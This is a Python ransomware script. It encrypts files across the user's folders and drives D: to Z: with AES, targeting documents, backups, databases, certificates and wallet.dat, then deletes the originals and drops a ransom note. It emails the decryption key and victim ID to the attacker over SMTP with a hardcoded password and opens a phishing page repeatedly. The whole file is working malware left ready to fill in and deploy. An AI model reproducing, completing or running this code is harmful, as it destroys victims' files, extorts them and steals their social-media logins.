mport os, fnmatch, struct, random, string, base64, json,ctypes,webbrowser

from Crypto import Random
from Crypto.Cipher import AES
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from Crypto.PublicKey import RSA
import datetime
newextns = 'haha' # your extension
encfolder = 'READ FOR DECRIPTION'
userhome = os.path.expanduser('~')

#key = RSA.generate(2048)
#exkey = key.exportKey('PEM')
key = ''.join([ random.choice(string.ascii_letters + string.digits) for n in xrange(16) ])

def gen_client_ID(size=12,chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

SMTP = True
ID = gen_client_ID(12)
print ID
def send_key_SMTP():
    ts = datetime.datetime.now()
    fromaddr = " " #add email
    toaddr = " "   # add email
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Rasomwere data:" +str(ts)
    print ID
    body = """\Client ID: %s \n Decryption key: %s """ %(ID,key)
    #meassage = """\ From : %s To : %s Subject : %s %s """ %(FROM,",".join(to),subject,body)
    msg.attach(MIMEText(body,'palin'))

    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(fromaddr,"vikrantsingh")
    text = msg.as_string()
    server.sendmail(fromaddr,toaddr,text)
    server.quit()


def facebook_login_page():  # create your phising page 
    for i in range(1,100):
        webbrowser.open("# your phising url",new=1,autoraise=True)

def write_instruction(dir, ext):
    try:
        files = open(dir + '\\README_FOR_DECRYPT.' + ext, 'w')
        files.write(" !!!!WARNING!!!!\r\n HELLO I HAVE ENCRYPTED ALL YOUR FILE ,\r\n DECRYPTION IS ONLY POSSIBLE BY OUR DECRYPTION PROGRAM,\r\n SO FOLLOWS THESE INSTRUCTIONS TO DECRYPT YOUR FILES ,\r\n 1.FACEBOOK LOGIN PAGE WILL OPEN ON YOUR BROWSER JUST LOGIN TO THE PAGE A PAGE WILL OPEN AUTOMATICALLY \r\n 2.JUST LIKE THE PAGE AND COMMENT YOUR CLIENT ID"+(ID)+" UNDER THE IMAGE AVAILABLE THERE\r\n 3.WE WILL SOON POSTED DECRYPTION PROGRAM UNDER YOUR COMMENT")
    except:
        pass

def delete_file(filename):
    try:
        os.remove(filename)
    except:
        pass


def find_files(root_dir):
    write_instruction(root_dir, 'md')
    extentions = ['*.txt',
     '*.exe',
     '*.php',
     '*.pl',
     '*.7z',
     '*.rar',
     '*.m4a',
     '*.wma',
     '*.avi',
     '*.wmv',
     '*.csv',
     '*.d3dbsp',
     '*.sc2save',
     '*.sie',
     '*.sum',
     '*.ibank',
     '*.t13',
     '*.t12',
     '*.qdf',
     '*.gdb',
     '*.tax',
     '*.pkpass',
     '*.bc6',
     '*.bc7',
     '*.bkp',
     '*.qic',
     '*.bkf',
     '*.sidn',
     '*.sidd',
     '*.mddata',
     '*.itl',
     '*.itdb',
     '*.icxs',
     '*.hvpl',
     '*.hplg',
     '*.hkdb',
     '*.mdbackup',
     '*.syncdb',
     '*.gho',
     '*.cas',
     '*.svg',
     '*.map',
     '*.wmo',
     '*.itm',
     '*.sb',
     '*.fos',
     '*.mcgame',
     '*.vdf',
     '*.ztmp',
     '*.sis',
     '*.sid',
     '*.ncf',
     '*.menu',
     '*.layout',
     '*.dmp',
     '*.blob',
     '*.esm',
     '*.001',
     '*.vtf',
     '*.dazip',
     '*.fpk',
     '*.mlx',
     '*.kf',
     '*.iwd',
     '*.vpk',
     '*.tor',
     '*.psk',
     '*.rim',
     '*.w3x',
     '*.fsh',
     '*.ntl',
     '*.arch00',
     '*.lvl',
     '*.snx',
     '*.cfr',
     '*.ff',
     '*.vpp_pc',
     '*.lrf',
     '*.m2',
     '*.mcmeta',
     '*.vfs0',
     '*.mpqge',
     '*.kdb',
     '*.db0',
     '*.mp3',
     '*.upx',
     '*.rofl',
     '*.hkx',
     '*.bar',
     '*.upk',
     '*.das',
     '*.iwi',
     '*.litemod',
     '*.asset',
     '*.forge',
     '*.ltx',
     '*.bsa',
     '*.apk',
     '*.re4',
     '*.sav',
     '*.lbf',
     '*.slm',
     '*.bik',
     '*.epk',
     '*.rgss3a',
     '*.pak',
     '*.big',
     '*.unity3d',
     '*.wotreplay',
     '*.xxx',
     '*.desc',
     '*.py',
     '*.m3u',
     '*.flv',
     '*.js',
     '*.css',
     '*.rb',
     '*.png',
     '*.jpeg',
     '*.p7c',
     '*.p7b',
     '*.p12',
     '*.pfx',
     '*.pem',
     '*.crt',
     '*.cer',
     '*.der',
     '*.x3f',
     '*.srw',
     '*.pef',
     '*.ptx',
     '*.r3d',
     '*.rw2',
     '*.rwl',
     '*.raw',
     '*.raf',
     '*.orf',
     '*.nrw',
     '*.mrwref',
     '*.mef',
     '*.erf',
     '*.kdc',
     '*.dcr',
     '*.cr2',
     '*.crw',
     '*.bay',
     '*.sr2',
     '*.srf',
     '*.arw',
     '*.3fr',
     '*.dng',
     '*.jpeg',
     '*.jpg',
     '*.cdr',
     '*.indd',
     '*.ai',
     '*.eps',
     '*.pdf',
     '*.pdd',
     '*.psd',
     '*.dbfv',
     '*.mdf',
     '*.wb2',
     '*.rtf',
     '*.wpd',
     '*.dxg',
     '*.xf',
     '*.dwg',
     '*.pst',
     '*.accdb',
     '*.mdb',
     '*.pptm',
     '*.pptx',
     '*.ppt',
     '*.xlk',
     '*.xlsb',
     '*.xlsm',
     '*.xlsx',
     '*.xls',
     '*.wps',
     '*.docm',
     '*.docx',
     '*.doc',
     '*.odb',
     '*.odc',
     '*.odm',
     '*.odp',
     '*.ods',
     '*.odt',
     '*.sql',
     '*.zip',
     '*.tar',
     '*.tar.gz',
     '*.tgz',
     '*.biz',
     '*.ocx',
     '*.html',
     '*.htm',
     '*.3gp',
     '*.srt',
     '*.cpp',
     '*.mid',
     '*.mkv',
     '*.mov',
     '*.asf',
     '*.mpeg',
     '*.vob',
     '*.mpg',
     '*.fla',
     '*.swf',
     '*.wav',
     '*.qcow2',
     '*.vdi',
     '*.vmdk',
     '*.vmx',
     '*.gpg',
     '*.aes',
     '*.ARC',
     '*.PAQ',
     '*.tar.bz2',
     '*.tbk',
     '*.bak',
     '*.djv',
     '*.djvu',
     '*.bmp',
     '*.cgm',
     '*.tif',
     '*.tiff',
     '*.NEF',
     '*.cmd',
     '*.class',
     '*.jar',
     '*.java',
     '*.asp',
     '*.brd',
     '*.sch',
     '*.dch',
     '*.dip',
     '*.vbs',
     '*.asm',
     '*.pas',
     '*.ldf',
     '*.ibd',
     '*.MYI',
     '*.MYD',
     '*.frm',
     '*.dbf',
     '*.SQLITEDB',
     '*.SQLITE3',
     '*.asc',
     '*.lay6',
     '*.lay',
     '*.ms11 (Security copy)',
     '*.sldm',
     '*.sldx',
     '*.ppsm',
     '*.ppsx',
     '*.ppam',
     '*.docb',
     '*.mml',
     '*.sxm',
     '*.otg',
     '*.slk',
     '*.xlw',
     '*.xlt',
     '*.xlm',
     '*.xlc',
     '*.dif',
     '*.stc',
     '*.sxc',
     '*.ots',
     '*.ods',
     '*.hwp',
     '*.dotm',
     '*.dotx',
     '*.docm',
     '*.DOT',
     '*.max',
     '*.xml',
     '*.uot',
     '*.stw',
     '*.sxw',
     '*.ott',
     '*.csr',
     '*.key',
     'wallet.dat']
    for dirpath, dirs, files in os.walk(root_dir):
        if 'Windows' not in dirpath:
            for basename in files:
                for ext in extentions:
                    if fnmatch.fnmatch(basename, ext):
                        filename = os.path.join(dirpath, basename)
                        yield filename


def encrypt_file(key,in_filename,out_filename=None,chunksize=64*1024):

    if not out_filename:
        out_filename = in_filename + newextns

    iv = ''.join(chr(random.randint(0,0xFF)) for i in range(16))

    encryptor = AES.new(key,AES.MODE_CBC,iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q',filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' *(16-len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))

listdir = (userhome + '\\Contacts\\',
 userhome + '\\Documents\\',
 userhome + '\\Downloads\\',
 userhome + '\\Favorites\\',
 userhome + '\\Links\\',
 userhome + '\\My Documents\\',
 userhome + '\\My Music\\',
 userhome + '\\My Pictures\\',
 userhome + '\\My Videos\\',
 userhome + '\\Desktop\\',
 'D:\\',
 'E:\\',
 'F:\\',
 'G:\\',
 'I:\\',
 'J:\\',
 'K:\\',
 'L:\\',
 'M:\\',
 'N:\\',
 'O:\\',
 'P:\\',
 'Q:\\',
 'R:\\',
 'S:\\',
 'T:\\',
 'U:\\',
 'V:\\',
 'W:\\',
 'X:\\',
 'Y:\\',
 'Z:\\')
for dir_ in listdir:
    for filename in find_files(dir_):
        encrypt_file(key,filename)
        #generate_file(dir_, filename)
        delete_file(filename)

write_instruction(userhome + '\\Desktop\\', 'txt')
os.startfile(userhome + '\\Desktop\\README_FOR_DECRYPT.txt')
send_key_SMTP()
facebook_login_page()
